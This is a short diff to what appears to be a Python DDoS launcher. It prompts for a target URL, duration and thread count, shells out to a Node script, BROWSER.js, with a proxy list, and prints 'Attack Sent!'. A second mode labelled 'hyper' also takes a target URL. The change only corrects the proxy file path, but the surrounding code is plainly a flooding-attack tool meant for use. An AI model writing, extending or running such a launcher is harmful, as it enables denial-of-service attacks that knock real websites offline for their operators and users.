@@ -88,7 +88,7 @@ def main():
             time = input("Time: ")
             thread = input("Threads: ")
             print('Attack Sent!')
-            os.system(f'node ./data/BROWSER.js {url} {time} {thread} proxy.txt')
+            os.system(f'node ./data/BROWSER.js {url} {time} {thread} ./proxy.txt')
             print('Attack Sent!')
         elif "hyper" in cnc:
             url = input("Url: ")
